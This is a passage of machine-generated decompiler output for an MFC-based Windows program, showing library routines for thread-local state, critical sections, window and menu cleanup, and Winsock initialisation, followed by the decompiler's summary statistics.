//----- (0041D270) --------------------------------------------------------
HLOCAL __thiscall sub_41D270(HLOCAL hMem, char a2)
{
  nullsub_2();
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}
// 41D28B: using guessed type int nullsub_2(void);

//----- (0041D28C) --------------------------------------------------------
int __thiscall sub_41D28C(int this, int a2, int a3)
{
  int v4; // edi
  int result; // eax
  void (__thiscall ***v6)(_DWORD, int); // ecx
  int v7; // [esp+Ch] [ebp-4h]

  v4 = 1;
  v7 = 1;
  if ( *(int *)(a2 + 8) <= 1 )
    goto LABEL_11;
  do
  {
    if ( !a3 || *(_DWORD *)(*(_DWORD *)(this + 16) + 8 * v4 + 4) == a3 )
    {
      v6 = *(void (__thiscall ****)(_DWORD, int))(*(_DWORD *)(a2 + 12) + 4 * v4);
      if ( v6 )
        (**v6)(v6, 1);
      result = *(_DWORD *)(a2 + 12);
      *(_DWORD *)(result + 4 * v4) = 0;
    }
    else
    {
      result = *(_DWORD *)(a2 + 12);
      if ( *(_DWORD *)(result + 4 * v4) )
        v7 = 0;
    }
    ++v4;
  }
  while ( v4 < *(_DWORD *)(a2 + 8) );
  if ( v7 )
  {
LABEL_11:
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 28));
    sub_41CF06((int *)(this + 20), a2);
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 28));
    LocalFree(*(HLOCAL *)(a2 + 12));
    if ( a2 )
      (**(void (__thiscall ***)(int, int))a2)(a2, 1);
    return TlsSetValue(*(_DWORD *)this, 0);
  }
  return result;
}

//----- (0041D413) --------------------------------------------------------
int __thiscall sub_41D413(void *this, int (*a2)(void))
{
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  if ( !*(_DWORD *)this )
  {
    sub_41D756(16);
    v5 = 0;
    if ( !*(_DWORD *)this )
      *(_DWORD *)this = a2();
    v5 = -1;
    AfxUnlockGlobals(16);
  }
  return *(_DWORD *)this;
}

//----- (0041D5E1) --------------------------------------------------------
char **sub_41D5E1()
{
  return &off_4209A0;
}
// 4209A0: using guessed type char *off_4209A0;

//----- (0041D5E7) --------------------------------------------------------
_DWORD *sub_41D5E7()
{
  _DWORD *v0; // esi
  _DWORD *result; // eax

  v0 = sub_40AEB5(byte_445490);
  result = 0;
  if ( v0 )
  {
    sub_4183E5(v0);
    *v0 = &CTempWnd::`vftable';
    return v0;
  }
  return result;
}
// 420E6C: using guessed type void *CTempWnd::`vftable';

//----- (0041D627) --------------------------------------------------------
CWnd *__thiscall sub_41D627(CWnd *this, char a2)
{
  CWnd::~CWnd(this);
  if ( (a2 & 1) != 0 )
    sub_40AF44((int)byte_445490, this);
  return this;
}

//----- (0041D64C) --------------------------------------------------------
char **sub_41D64C()
{
  return &off_420978;
}
// 420978: using guessed type char *off_420978;

//----- (0041D652) --------------------------------------------------------
int sub_41D652()
{
  sub_41D65C();
  return atexit(unknown_libname_40);
}

//----- (0041D65C) --------------------------------------------------------
char *sub_41D65C()
{
  return sub_40AE51(byte_445490, 60, 64);
}

//----- (0041D692) --------------------------------------------------------
_DWORD *sub_41D692()
{
  _DWORD *v0; // ecx
  _DWORD *result; // eax

  v0 = CNoTrackObject::operator new(0x10u);
  result = 0;
  if ( v0 )
    return sub_41C309(v0);
  return result;
}

//----- (0041D6C3) --------------------------------------------------------
int sub_41D6C3()
{
  signed int Version; // eax

  if ( !dword_4457CC )
  {
    dword_4457CC = 1;
    Version = GetVersion();
    if ( (unsigned __int8)Version >= 4u || Version >= 0 )
    {
      dword_4457C8 = 0;
      InitializeCriticalSection(&stru_445618);
    }
    else
    {
      dword_4457C8 = 1;
    }
  }
  return dword_4457CC;
}
// 4457C8: using guessed type int dword_4457C8;
// 4457CC: using guessed type int dword_4457CC;

//----- (0041D708) --------------------------------------------------------
void sub_41D708()
{
  int *v0; // esi
  struct _RTL_CRITICAL_SECTION *v1; // ebx

  if ( dword_4457CC )
  {
    --dword_4457CC;
    if ( !dword_4457C8 )
    {
      DeleteCriticalSection(&stru_445618);
      v0 = &dword_4455D4;
      v1 = &stru_445630;
      do
      {
        if ( *v0 )
        {
          DeleteCriticalSection(v1);
          --*v0;
        }
        ++v1;
        ++v0;
      }
      while ( (int)v1 < (int)&dword_4457C8 );
    }
  }
}
// 4455D4: using guessed type int dword_4455D4;
// 4457C8: using guessed type int dword_4457C8;
// 4457CC: using guessed type int dword_4457CC;

//----- (0041D756) --------------------------------------------------------
void __stdcall sub_41D756(int a1)
{
  if ( !dword_4457CC )
    sub_41D6C3();
  if ( !dword_4457C8 )
  {
    if ( !dword_4455D4[a1] )
    {
      EnterCriticalSection(&stru_445618);
      if ( !dword_4455D4[a1] )
      {
        InitializeCriticalSection((LPCRITICAL_SECTION)(24 * a1 + 4478512));
        ++dword_4455D4[a1];
      }
      LeaveCriticalSection(&stru_445618);
    }
    EnterCriticalSection((LPCRITICAL_SECTION)(24 * a1 + 4478512));
  }
}
// 4455D4: using guessed type int dword_4455D4[17];
// 4457C8: using guessed type int dword_4457C8;
// 4457CC: using guessed type int dword_4457CC;

//----- (0041D7E7) --------------------------------------------------------
int sub_41D7E7()
{
  sub_41D7F1();
  return atexit(sub_41D807);
}

//----- (0041D7F1) --------------------------------------------------------
AUX_DATA *sub_41D7F1()
{
  return AUX_DATA::AUX_DATA((AUX_DATA *)&dword_4457D0);
}
// 4457D0: using guessed type int dword_4457D0;

//----- (0041D807) --------------------------------------------------------
void __cdecl sub_41D807()
{
  AfxDeleteObject((void **)&dword_4457D0 + 20);
}
// 4457D0: using guessed type int dword_4457D0;

//----- (0041D8FE) --------------------------------------------------------
int (__stdcall *__thiscall sub_41D8FE(_DWORD *this))(_DWORD)
{
  int (__stdcall *result)(_DWORD); // eax
  HMODULE v3; // esi

  *this = &_AFX_CTL3D_STATE::`vftable';
  result = (int (__stdcall *)(_DWORD))this[4];
  if ( result )
    result = (int (__stdcall *)(_DWORD))result(0);
  v3 = (HMODULE)this[2];
  if ( v3 )
    return (int (__stdcall *)(_DWORD))FreeLibrary(v3);
  return result;
}
// 420430: using guessed type void *_AFX_CTL3D_STATE::`vftable';

//----- (0041D93F) --------------------------------------------------------
int (__cdecl *__thiscall sub_41D93F(_DWORD *this))(_DWORD *)
{
  int (__cdecl *result)(_DWORD *); // eax

  *this = &_AFX_CTL3D_THREAD::`vftable';
  result = (int (__cdecl *)(_DWORD *))dword_445840;
  if ( dword_445840 )
  {
    result = *(int (__cdecl **)(_DWORD *))(dword_445840 + 24);
    if ( result )
      return (int (__cdecl *)(_DWORD *))result(this);
  }
  return result;
}
// 420438: using guessed type void *_AFX_CTL3D_THREAD::`vftable';

//----- (0041D975) --------------------------------------------------------
int sub_41D975()
{
  nullsub_16();
  return atexit(sub_41D98C);
}
// 41D97F: using guessed type int nullsub_16(void);

//----- (0041D98C) --------------------------------------------------------
void __cdecl sub_41D98C()
{
  CThreadLocalObject::~CThreadLocalObject((CThreadLocalObject *)&unk_44583C);
}

//----- (0041D996) --------------------------------------------------------
int sub_41D996()
{
  nullsub_17();
  return atexit(sub_41D9AD);
}
// 41D9A0: using guessed type int nullsub_17(void);

//----- (0041D9AD) --------------------------------------------------------
void __cdecl sub_41D9AD()
{
  CProcessLocalObject::~CProcessLocalObject((CProcessLocalObject *)&dword_445840);
}

//----- (0041D9B7) --------------------------------------------------------
char **sub_41D9B7()
{
  return &off_420F30;
}
// 420F30: using guessed type char *off_420F30;

//----- (0041D9BD) --------------------------------------------------------
char **sub_41D9BD()
{
  return &off_420F68;
}
// 420F68: using guessed type char *off_420F68;

//----- (0041DB99) --------------------------------------------------------
char **sub_41DB99()
{
  return &off_420FB0;
}
// 420FB0: using guessed type char *off_420FB0;

//----- (0041DB9F) --------------------------------------------------------
char **sub_41DB9F()
{
  return &off_420FC8;
}
// 420FC8: using guessed type char *off_420FC8;

//----- (0041DBCD) --------------------------------------------------------
int sub_41DBCD()
{
  int result; // eax

  result = AfxInitDBCS();
  dword_445844 = result;
  return result;
}
// 445844: using guessed type int dword_445844;

//----- (0041DBF2) --------------------------------------------------------
char **sub_41DBF2()
{
  return &off_421048;
}
// 421048: using guessed type char *off_421048;

//----- (0041DC14) --------------------------------------------------------
unsigned int *__thiscall sub_41DC14(unsigned int *this, char a2)
{
  sub_41DC34(this);
  if ( (a2 & 1) != 0 )
    sub_40AF44((int)&unk_445850, this);
  return this;
}

//----- (0041DC34) --------------------------------------------------------
BOOL __thiscall sub_41DC34(unsigned int *this)
{
  *this = (unsigned int)&CMenu::`vftable';
  return sub_41ADAA(this);
}
// 42106C: using guessed type void *CMenu::`vftable';

//----- (0041DC5D) --------------------------------------------------------
char **sub_41DC5D()
{
  return &off_421020;
}
// 421020: using guessed type char *off_421020;

//----- (0041DC63) --------------------------------------------------------
int sub_41DC63()
{
  sub_41DC6D();
  return atexit(unknown_libname_41);
}

//----- (0041DC6D) --------------------------------------------------------
char *sub_41DC6D()
{
  return sub_40AE51(byte_445850, 8, 64);
}

//----- (0041DCA3) --------------------------------------------------------
void *__thiscall sub_41DCA3(_DWORD *this)
{
  void *result; // eax
  int (__cdecl *v2)(_DWORD *); // ecx

  result = &loc_41E62C;
  *this = &_AFX_SOCK_STATE::`vftable';
  v2 = (int (__cdecl *)(_DWORD *))this[3];
  if ( v2 )
    return (void *)v2(this);
  return result;
}
// 4208D8: using guessed type void *_AFX_SOCK_STATE::`vftable';

//----- (0041DCD0) --------------------------------------------------------
_DWORD *__thiscall sub_41DCD0(_DWORD *hMem, char a2)
{
  sub_41DCA3(hMem);
  if ( (a2 & 1) != 0 )
    CNoTrackObject::operator delete(hMem);
  return hMem;
}

//----- (0041DD1D) --------------------------------------------------------
int __stdcall sub_41DD1D(char *lpWSAData)
{
  int v1; // edi
  char *v2; // esi
  struct AFX_MODULE_THREAD_STATE *ModuleThreadState; // esi
  _DWORD *v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // ecx
  _DWORD *v10; // eax
  char v11; // [esp+Ch] [ebp-19Ch] BYREF
  int v12; // [esp+1A4h] [ebp-4h]

  v1 = sub_41D413(&unk_443C08, CProcessLocal<_AFX_SOCK_STATE>::CreateObject);
  if ( *(_DWORD *)(v1 + 12) )
    goto LABEL_8;
  v2 = lpWSAData;
  if ( !lpWSAData )
    v2 = &v11;
  if ( WSAStartup(0x101u, (LPWSADATA)v2) )
    return 0;
  if ( *v2 != 1 || v2[1] != 1 )
  {
    WSACleanup();
    return 0;
  }
  *(_DWORD *)(v1 + 12) = AfxSocketTerm;
LABEL_8:
  ModuleThreadState = AfxGetModuleThreadState();
  if ( !*((_DWORD *)ModuleThreadState + 12) )
  {
    v4 = sub_4179F3(0x1Cu);
    v12 = 0;
    if ( v4 )
      v5 = sub_416AD8(v4, 10);
    else
      v5 = 0;
    v12 = -1;
    *((_DWORD *)ModuleThreadState + 12) = v5;
  }
  if ( !*((_DWORD *)ModuleThreadState + 13) )
  {
    v7 = sub_4179F3(0x1Cu);
    v12 = 1;
    if ( v7 )
      v8 = sub_416AD8(v7, 10);
    else
      v8 = 0;
    v12 = -1;
    *((_DWORD *)ModuleThreadState + 13) = v8;
  }
  if ( !*((_DWORD *)ModuleThreadState + 14) )
  {
    v9 = sub_4179F3(0x1Cu);
    v12 = 2;
    if ( v9 )
      v10 = sub_4169DD(v9, 10);
    else
      v10 = 0;
    *((_DWORD *)ModuleThreadState + 14) = v10;
  }
  return 1;
}
// 41CEB4: using guessed type int CProcessLocal<_AFX_SOCK_STATE>::CreateObject();

//----- (0041DE22) --------------------------------------------------------
void __thiscall sub_41DE22(void **this)
{
  *this = &_AFX_WIN_STATE::`vftable';
  AfxDeleteObject(this + 1);
}
// 4202E0: using guessed type void *_AFX_WIN_STATE::`vftable';

// nfuncs=1083 queued=558 decompiled=558 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 558 function(s)"
